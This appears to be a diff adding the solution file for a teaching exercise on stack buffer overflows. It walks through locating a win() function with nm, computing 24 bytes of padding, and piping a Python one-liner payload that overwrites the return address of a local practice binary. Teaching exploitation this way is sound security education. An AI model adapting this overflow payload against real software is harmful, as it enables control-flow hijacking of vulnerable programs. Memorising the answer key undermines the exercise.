@@ -1,0 +1,25 @@
+Solution — Exercise 01: Return-Oriented Hijacking
+==================================================
+
+Step 1: Find the address of win()
+  nm target | grep win
+  → e.g. 0x0000000000401136 T win
+
+Step 2: Calculate the padding
+  The buffer is 16 bytes. After it sits the saved RBP (8 bytes).
+  After that is the return address — your target.
+  Total padding = 16 + 8 = 24 bytes.
+
+Step 3: Build and send the payload
+  python3 -c "
+  import sys, struct
+  addr = 0x401136  # replace with your address from step 1
+  sys.stdout.buffer.write(b'A' * 24 + struct.pack('<Q', addr))
+  " | ./target
+
+  You should see: [SUCCESS] You hijacked the return address!
+
+Why it works:
+  strcpy/read with no bounds check lets you write past the buffer.
+  The CPU uses the value at [rsp] as the next instruction pointer
+  when executing 'ret'. You've replaced it with win()'s address.
